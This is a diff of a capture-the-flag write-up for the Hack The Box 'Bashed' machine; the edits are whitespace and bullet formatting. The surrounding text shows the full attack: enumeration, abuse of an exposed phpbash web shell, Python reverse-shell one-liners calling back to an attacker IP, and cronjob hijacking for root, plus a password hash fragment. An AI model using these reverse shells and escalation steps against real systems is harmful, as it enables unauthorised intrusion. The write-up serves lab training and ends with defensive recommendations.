@@ -31,13 +31,11 @@ PORT   STATE SERVICE REASON  VERSION
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Fri May 29 19:05:10 2020 -- 1 IP address (1 host up) scanned in 59.85 seconds
-
 ```
 
 2\. We see that the port `80/tcp` is the only open port on this machine. Let's run `gobuster` and find interesting directories on this web server:  
 ```
 gobuster dir -u http://10.10.10.68:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o "/home/kali/toolbox/writeups/htb.bashed/results/10.10.10.68/scans/tcp_80_http_gobuster_dirbuster.txt"
-
 ```
 
 3\. We find a few directories from `gobuster` scan and the `/dev` directory lists two interesting files: `phpbash.min.php` and `phpbash.php`  
@@ -55,7 +53,6 @@ $ cat results/10.10.10.68/scans/tcp_80_http_gobuster_dirbuster.txt
   http://10.10.10.68:80/config.php (Status: 200) [Size: 0]
   http://10.10.10.68:80/fonts (Status: 301) [Size: 310]
   http://10.10.10.68:80/single.html (Status: 200) [Size: 7476]
-
 ```
 
 ![writeup.enumeration.steps.3.1](/static/files/posts_htb_bashed/screenshot03.png)  
@@ -65,7 +62,6 @@ $ cat results/10.10.10.68/scans/tcp_80_http_gobuster_dirbuster.txt
 4\. We find that [`phpbash`](https://github.com/Arrexel/phpbash) is a minimal web shell that can give us interactive access to the target machine.  
 
 ![writeup.enumeration.steps.4.1](/static/files/posts_htb_bashed/screenshot02.png)  
-
 
 ### Findings
 #### Open Ports:
@@ -78,7 +74,6 @@ $ cat results/10.10.10.68/scans/tcp_80_http_gobuster_dirbuster.txt
 /dev/phpbash.php
 ```
 
-
 ## Phase #2: Exploitation
 1\. We visit the `/dev/phpbash.min.php` page and find the `phpbash` interactive web shell UI which enables command execution and further enumeration:  
 
@@ -88,11 +83,9 @@ $ cat results/10.10.10.68/scans/tcp_80_http_gobuster_dirbuster.txt
 ```
 nc -nlvp 443
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
 ```
 
 ![writeup.exploitation.steps.2.1](/static/files/posts_htb_bashed/screenshot06.png)  
-
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -128,13 +121,11 @@ arrexel
 scriptmanager
 ```
 
-
 ## Phase #3: Privilege Escalation
 1\. We find that the user `www-data` can run any command as user `scriptmanager` using `sudo`:  
 ```
 sudo -l
 sudo -u scriptmanager /bin/bash
-
 ```
 
 ![writeup.privesc.steps.1.1](/static/files/posts_htb_bashed/screenshot07.png)  
@@ -145,7 +136,6 @@ sudo -u scriptmanager /bin/bash
 ```
 ls -la /scripts
 cat /scripts/test.py
-
 ```
 
 ![writeup.privesc.steps.2.1](/static/files/posts_htb_bashed/screenshot08.png)  
@@ -158,7 +148,6 @@ cat /scripts/test.py
 ```
 nc -nlvp 9999
 echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.4",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >>/scripts/test.py
-
 ```
 
 ![writeup.privesc.steps.3.1](/static/files/posts_htb_bashed/screenshot12.png)  
@@ -166,14 +155,11 @@ echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STR
 4\. As soon as the cronjob runs, we get the elevated shell and can now view the `root.txt` flag file:  
 ```
 cat /root/root.txt
-
 ```
 
 ![writeup.privesc.steps.4.1](/static/files/posts_htb_bashed/screenshot13.png)  
 
 ![writeup.privesc.steps.4.2](/static/files/posts_htb_bashed/screenshot14.png)  
-
-
 
 ## Learning/Recommendation
 * Production web server instances should not host developement tools like a PHP web shell. It allowed the attacker to gain interactive access of the target system.
@@ -193,6 +179,6 @@ scriptmanager:$6$WahhM57B$rOHkWDRQpds96uWXkRCzA6b5L3wOorpe4uwn5U32yKRsMWDwKAm.RF
 ```
 
 ## References
-[+] <https://www.hackthebox.eu/home/machines/profile/118>  
-[+] <https://medium.com/@ranakhalil101/hack-the-box-bashed-writup-a8e51a2914c2>  
-[+] <https://0xdf.gitlab.io/2018/04/29/htb-bashed.html>  
+* <https://www.hackthebox.eu/home/machines/profile/118>  
+* <https://medium.com/@ranakhalil101/hack-the-box-bashed-writup-a8e51a2914c2>  
+* <https://0xdf.gitlab.io/2018/04/29/htb-bashed.html>  
